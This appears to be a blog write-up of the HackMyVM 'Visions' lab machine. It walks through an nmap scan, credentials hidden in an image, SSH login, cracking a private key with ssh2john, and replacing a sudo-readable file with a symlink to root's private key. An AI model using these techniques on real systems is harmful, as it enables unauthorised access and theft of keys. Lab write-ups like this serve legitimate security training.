---
layout: post
author: kohaku
title:  "Visions"
date:   2022-01-01 09:08:02 PM -03
category: HackMyVM
---

[HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=Visions)

# Enumeration

{% highlight text  %}
# Nmap 7.92 scan initiated Tue Dec 28 15:39:17 2021 as: nmap -sC -sV -v -oN nmap 192.168.0.213
Nmap scan report for 192.168.0.213
Host is up (0.016s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 85:d0:93:ff:b6:be:e8:48:a9:2c:86:4c:b6:84:1f:85 (RSA)
|   256 5d:fb:77:a5:d3:34:4c:46:96:b6:28:a2:6b:9f:74:de (ECDSA)
|_  256 76:3a:c5:88:89:f2:ab:82:05:80:80:f9:6c:3b:20:9d (ED25519)
80/tcp open  http    nginx 1.14.2
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Dec 28 15:39:25 2021 -- 1 IP address (1 host up) scanned in 7.74 seconds
{% endhighlight  %}

## Port 80

Source-code of the page has a comment

{% highlight text  %}
Only those that can see the invisible can do the imposible.
You have to be able to see what doesnt exist.
Only those that can see the invisible being able to see whats not there.
-alicia 
{% endhighlight  %}

The final of the page

{% highlight text  %}
<img src="white.png">
{% endhighlight  %}

We can wget this page and analyse with gimp

{% highlight bash  %}
wget $IP/white.png
{% endhighlight  %}

Change the Color Curves we can see a credencial

![Untitled](/images/visions/gimp.png)

{% highlight text  %}
sophia:seemstobeimpossible
{% endhighlight  %}

## User

{% highlight bash  %}
ssh sophia@$IP 
{% endhighlight  %}

{% highlight bash  %}
sudo -l

User sophia may run the following commands on visions:
    (ALL : ALL) NOPASSWD: /usr/bin/cat /home/isabella/.invisible
{% endhighlight  %}

Getting the .invisible file we can see it’s a private key

Crack the private key using ssh2john

{% highlight bash  %}
/usr/share/john/ssh2john.py id_rsa > id_rsa.hash
password = invisible
{% endhighlight  %}

Make a ssh to isabella user using this private key

## Root

Delete the .invisible file and create a symbolic link to root’s private key

![Untitled](/images/visions/root1.png)

And with sophia cat the .invisible file

![Untitled](/images/visions/root2.png)

Root id_rsa